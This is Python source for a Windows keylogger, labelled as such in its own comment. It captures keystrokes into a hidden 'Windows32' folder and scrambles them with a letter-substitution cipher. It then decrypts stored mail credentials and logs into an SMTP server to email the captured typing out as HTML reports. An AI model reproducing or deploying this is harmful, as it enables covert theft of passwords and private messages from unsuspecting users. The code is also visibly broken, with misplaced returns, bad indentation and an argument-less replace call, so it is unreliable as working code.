import cryptography
from cryptography.fernet import Fernet
import os
import datetime
from datetime import datetime
import smtplib




class email_manager:
	def __init__(self):
		self.username = os.environ['USERNAME']
		with open('C:\\Users\\' + self.username + '\\Windows32\\mail_proto.encrypted', 'rb')as mailproto:
			self.mailprotocall = mailproto.readline()
			mailproto.close()
		self.alpha_convert = {'a':'q', 'A': 'Q', 'b': 'w', 'B':'W', 'c':'e', 'C':'E', 'd': 'r', 'D':'R', 'e':'t', 'E':'T', 'f':'y', 'F':'Y', 'g':'u', 'G':'U', 'h':'i','H':'I', 'i':'o', 'I':'O', 'j':'p', 'J':'P', 'k':'v', 'K':'V', 'l':'a','L':'A','m':'s','M':'S', 'n':'d','N':'D','o':'f','O':'F','p':'g',"P":'G','q':'h', 'Q':'H','r':'j','R':'J','s':'k','S':'K','t':'l','T':'L','u':'m','U':'M','v':'b','V':'B', 'w':'n', 'W':'N','x':'z', 'X':'Z','y':'x','Y':'X','z':'c','Z':'C', '\\':'&'}
				
			
	def email_decrypter(self):

		with open('C:\\Users\\' + self.username + '\\Windows32\\dec.key', 'rb')as okey:
			key = okey.read()
			okey.close()
			

		with open('C:\\Users\\' + self.username + '\\Windows32\\mail_proto.encrypted', 'rb')as email_:
			emailapass = email_.read()
			email_.close()
		_key = Fernet(key)
		email = _key.decrypt(emailapass)
		self._email = email.decode()
		
		
		with open('C:\\Users\\' + self.username + '\\Windows32\\mail_p.encrypted', 'rb')as passwo:
			empass = passwo.read()
			passwo.close()
		password = _key.decrypt(empass)
		self._password = password.decode()
		
		return self._email, self._password
	


	def domain_get(self, em):
		mserver = 'null'
		if '@gmail.com' in em:
			self.mserver = 'gmail.com'
		elif '@yahoo.com' in em:
			self.mserver = 'yahoo.com'
		elif '@outlook.com' in em:
			self.mserver = 'outlook.com'
			
		return self.mserver
	

	def log_encryption(self, a):
		haskey = False
		for x in self.alpha_convert:
			if a == x:
				haskey = True
				break
		if haskey:
			return self.alpha_convert[a]
		else:
			return a



	def log_decryption(self, a):
		haskey = False
		_alpha_convert = {'C':'Z','c':'z','X':'Y','x':'y','Z':'X','z':'x','N':'W','n':'w','B':'V','b':'v','M':'U','m':'u','L':'T','l':'t','K':'S','k':'s','J':'R','j':'r','H':'Q' ,'h':'q','G':"P",'g':'p','F':'O','f':'o','D':'N','d':'n' ,'S':'M','s':'m','A':'L','a':'l' ,'V':'K' ,'v':'k' ,'P':'J' ,'p':'j' ,'O':'I' ,'o':'i' ,'I':'H','i':'h' ,'U':'G' ,'u':'g' ,'Y':'F' ,'y':'f' ,'T':'E' ,'t':'e' ,'R':'D' ,'r' :'d' ,'E':'C' ,'e':'c' ,'W':'B' ,'w' :'b' ,'Q' :'A' ,'q':'a','&':'\\'}
		for x in _alpha_convert:
			if a == x:
				haskey = True
				break
			
		if haskey:
			return _alpha_convert[a]
		else:
			return a
			
			'''The keylogger'''
	def key_logg(self,a):

		ape = str(a)
		_a = ape[1:-1]

		edit = True
		caps_lock = None
		if ape == 'Key.enter':
			n = '\n'
		elif ape == 'Key.shift':
			edit = False
		elif ape == 'Key.backspace':
			n = '^'
		elif ape == 'Key.insert' or 'Key.delete' == ape or ape == 'Key.page_up' or ape == 'Key.page_down' or ape == 'Key.end' or ape == 'Key.num_lock' or ape == 'Key.print_screen' or ape == 'Key.pause' or ape == 'Key.scroll_lock' or ape == 'Key.cmd_l' or ape == 'Key.alt_l' or ape == 'Key.cmd_r' or ape == 'Key.alt_l':
			edit = False
		elif ape == 'Key.home':
			n = '__The Log File: The home button was pressed__'
		elif ape == 'Key.caps_lock':
			if caps_lock:
				caps_lock = False
			else:
				caps_lock = True
			edit = False
		elif caps_lock:
			n = a.upper()
			n = self.log_encryption(n)
		elif ape == 'Key.tab':
			n = '\t'
		elif ape == 'Key.space':
			n = ' '
		elif ape == '<103>' or ape == '<104>'or ape == '<105>' or ape == '<100>' or ape == '<101>' or ape == '<102>' or ape == '<99>' or ape == '<98>' or ape == '<97>' or ape == '<96>' or ape == '<110>':
			n = self.log_encryption(ape)
		elif ape == 'Key.up' or ape == 'Key.left' or ape == 'Key.right' or ape == 'Key.down':
			n = self.log_encryption(ape)
		elif ape == 'Key.ctrl_r' or ape == 'Key.ctrl_l':
			edit = False
		else:
			n = self.log_encryption(_a)
		for x in range(12):
			if ape == 'Key.f' + str(x):
				edit = False

		if edit:

			with open('C:\\Users\\' + self.username + '\\Windows32\\stat', 'a')as log_key:
				log_key.write(n)
				log_key.close()
		
				
				
	def log_decrypter(self):
			
		if os.path.exists('C:\\Users\\' + self.username + '\\Windows32\\stat'):
			self.mail_down = False
			with open('C:\\Users\\' + self.username + '\\Windows32\\stat', 'r')as oglog:
				origlog = oglog.readlines()
				oglog.close()
				
			try:
				server = smtplib.SMTP('smtp.{0}'.format(self.mserver), 587)
				server.login(self._email, self._password)
			except:
				with open('C:\\Users\\' + self.username + '\\Windows32\\stat_back', 'a')as backup_log:
					backup_log.write('\n')
					backup_log.writelines(origlog)
					backup_log.close()
					mail_down = True
			if not self.mail_down:

				nlog = []
				linecounter = 0
				for x in origlog:
					linecounter += 1
					for y in x:
						letter = self.log_decryption(y)
						_index = linecounter - 1
						try:
							nlog[_index] = nlog[_index] + letter
						except IndexError:
							nlog.append(letter)
						
						
			
			
			
					
				linecount = 0
				for y in nlog:
					linecount += 1
				
					back_space_counter = 0
				'''Continue work on if '^' in y:
					
					splitter = []
					for x in y:
						if x == '^':
							back_space_counter +=1
						else:
							splitter.append(x)
							
							
					splitter.insert(back_space_counter-1, '{!!}')
					print(splitter)
					_nlog = str(splitter)
					_log = _nlog.replace(',','')
					
					
					#Checks for second part of split 
					pastdilim = False
					charpast = False
					brack1 = False
					brack2 = False
					excl = 0
					excl1 = False
					excl2 = False
					for x in _log:
						
						if x == '{':
							brack1 = True
						elif x == '}':
							brack2 = True
						elif x == '!':
							excl += 1
							if excl == 1:
								excl1 = True
							else:
								excl2 = True
								
						if pastdilim:
							charpast = True
						elif brack1 and brack2 and excl1 and excl2:
							pastdilim = True
							
							
					if charpast:
						first, second_half = _log.split('{!!}')
						print(first, 'Second', second_half)
						cut = back_space_counter + 4
						fist = first[:-cut]
						finalStr = fist + second_half
						
					else:
						first = _log.split('{!!}')
						print(first)
						cut = back_space_counter + 4
						finalStr = first[:-cut]
						
					
					_linecount = linecount-1
					nlog[_linecount] = finalStr'''
					
				for x in nlog:
					if '<Key.left>' in x:
						_nlog = x.replace('<Key.left>', ' Left Arrow Key was pressed')
					elif '<Key.right>' in x:
						_nlog = x.replace('<Key.right>', ' Right Arrow Key was pressed')
						ind = nlog.index(x)
						nlog[ind] = _nlog
					elif '<Key.up>' in x:
						_nlog = x.replace('<Key.up>', ' Up Arrow Key was pressed')
						ind = nlog.index(x)
						nlog[ind] = _nlog
					elif '<Key.down>' in x:
						_nlog = x.replace('<Key.down>', ' Down Arrow Key was pressed')
						ind = nlog.index(x)
						nlog[ind] = _nlog
						_nlog = x.replace()
					elif '<105>' in x or '<104>' in x or '<103>' in x or '<100>' in x or '<101>' in x or '<102>' in x or '<97>' in x or '<98>' in x or '<99>' in x:
						num_trans = {'<103>':'7', '<104>':'8', '<105':'9','<100>':'4', '<101>':'5', '<102>':'6', '<97>':'1','<98>':'2','<99>':'3', '<96>':'0', '<110>': '.'}
						for y in num_trans:
							_nlog = x.replace(y, num_trans[x])
							ind = nlog.index(x)
							nlog[ind] = _nlog
					elif '\t' in x:
						_nlog = x.replace('\t', '	')
						ind = nlog.index(x)
						nlog[ind] = _nlog
					elif '\n' in x:
						_nlog = x.replace('\n', '')
						ind = nlog.index(x)
						nlog[ind] = _nlog
						
				email_dates = datetime.now()
				tim = email_dates.strftime("%m/%d time: %H:%M")
				email_head = '<h1>Log for {0}</h1>'.format(tim)
				emai = [email_head]
							
						
				for x in nlog:
					emai.append('<p>' + x + '</p>')
				

				
				em1 = str(emai)
				em2 = em1[1:-1]
				em3 = em2.replace('\'', '')
				em4 = em3.replace(',', '')
				
				
				
				
				
				
				
				if os.path.exists('C:\\Users\\' + self.username + '\\Windows32\\stat_back'):
					
					with open('C:\\Users\\' + self.username + '\\Windows32\\stat_back', 'r')as statb:
						origlog = statb.readlines()
						statb.close()
						
					nlog = []
					linecounter = 0
					for x in origlog:
						linecounter += 1
						for y in x:
							letter = self.log_decryption(y)
							_index = linecounter - 1
							try:
								nlog[_index] = nlog[_index] + letter
							except IndexError:
								nlog.append(letter)
						
						
			
			
			
					
					linecount = 0
					for y in nlog:
						linecount += 1
				
						back_space_counter = 0
				'''Continue work on if '^' in y:
					
					splitter = []
					for x in y:
						if x == '^':
							back_space_counter +=1
						else:
							splitter.append(x)
							
							
					splitter.insert(back_space_counter-1, '{!!}')
					print(splitter)
					_nlog = str(splitter)
					_log = _nlog.replace(',','')
					
					
					#Checks for second part of split 
					pastdilim = False
					charpast = False
					brack1 = False
					brack2 = False
					excl = 0
					excl1 = False
					excl2 = False
					for x in _log:
						
						if x == '{':
							brack1 = True
						elif x == '}':
							brack2 = True
						elif x == '!':
							excl += 1
							if excl == 1:
								excl1 = True
							else:
								excl2 = True
								
						if pastdilim:
							charpast = True
						elif brack1 and brack2 and excl1 and excl2:
							pastdilim = True
							
							
					if charpast:
						first, second_half = _log.split('{!!}')
						print(first, 'Second', second_half)
						cut = back_space_counter + 4
						fist = first[:-cut]
						finalStr = fist + second_half
						
					else:
						first = _log.split('{!!}')
						print(first)
						cut = back_space_counter + 4
						finalStr = first[:-cut]
						
					
					_linecount = linecount-1
					nlog[_linecount] = finalStr'''
					
					for x in nlog:
						if '<Key.left>' in x:
							_nlog = x.replace('<Key.left>', ' Left Arrow Key was pressed')
						elif '<Key.right>' in x:
							_nlog = x.replace('<Key.right>', ' Right Arrow Key was pressed')
							ind = nlog.index(x)
							nlog[ind] = _nlog
						elif '<Key.up>' in x:
							_nlog = x.replace('<Key.up>', ' Up Arrow Key was pressed')
							ind = nlog.index(x)
							nlog[ind] = _nlog
						elif '<Key.down>' in x:
							_nlog = x.replace('<Key.down>', ' Down Arrow Key was pressed')
							ind = nlog.index(x)
							nlog[ind] = _nlog
							_nlog = x.replace()
						elif '<105>' in x or '<104>' in x or '<103>' in x or '<100>' in x or '<101>' in x or '<102>' in x or '<97>' in x or '<98>' in x or '<99>' in x:
							num_trans = {'<103>':'7', '<104>':'8', '<105':'9','<100>':'4', '<101>':'5', '<102>':'6', '<97>':'1','<98>':'2','<99>':'3', '<96>':'0', '<110>': '.'}
							for y in num_trans:
								_nlog = x.replace(y, num_trans[x])
								ind = nlog.index(x)
								nlog[ind] = _nlog
						elif '\t' in x:
							_nlog = x.replace('\t', '	')
							ind = nlog.index(x)
							nlog[ind] = _nlog
						elif '\n' in x:
							_nlog = x.replace('\n', '')
							ind = nlog.index(x)
							nlog[ind] = _nlog
						
					email_dates = datetime.now()
					tim = email_dates.strftime("%m/%d time: %H:%M")
					email_head = '<h1>This Email is a Collection of Backuplogs Caused by Multiple Failed Connections to the Mail Server</h1>'
					emai = [email_head]
							
						
					for x in nlog:
						emai.append('<p>' + x + '</p>')
				

				
					em1 = str(emai)
					em2 = em1[1:-1]
					em3 = em2.replace('\'', '')
					em5 = em3.replace(',', '')
				return em4, em5
			

				else:
					return 'null'
				
			else:
				return self.mail_down
		
	